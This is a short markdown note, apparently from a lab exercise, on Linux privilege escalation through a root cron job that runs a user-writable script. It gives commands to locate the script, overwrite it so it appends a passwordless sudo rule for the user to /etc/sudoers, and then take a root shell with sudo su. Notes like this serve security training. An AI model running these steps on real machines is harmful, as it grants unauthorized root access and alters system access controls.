@@ -1,0 +1,51 @@
+### Cron tasks scripts
+
+---
+
+##### Simple Example : we find an file named message owned by root
+
+> - find / -name message
+> - ls -l /tmp/
+
+look at the last modification date of  the file
+
+This means there is some script/binary which is copying this file from student home directory to /tmp directory. Search for that script. If this script is doing simple copy operation, it must have source destination of the file in it. Try to locate that by using grep command
+
+---
+
+> - grep -nri “/tmp/message” /usr
+> - i : ignore case
+> - n : print the line number
+> - r : recursive
+
+we find >>>>>>>>> usr/local/share/copy.sh
+
+> cat /usr/local/share/copy.sh
+
+---
+
+As the script file is writable by current “student” user, it can be modified to execute our commands. This script is executed by root cron job, so it can do privileged operation.
+
+*But, the file can’t be modified directly as there is no text editor on the system.*
+
+---
+
+##### Modify the script in order to add user student to sudoers and allow him to connect without password
+
+printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' >
+/usr/local/share/copy.sh
+
+---
+
+##### Check current sudoers list.
+
+Command: sudo -l
+
+If there are no new entries, wait for 1 minute (i.e. the cron job runs every 1 minute)
+and check the sudoers list again. This time new entry is there
+
+---
+
+##### Privs Escalation
+
+sudo su
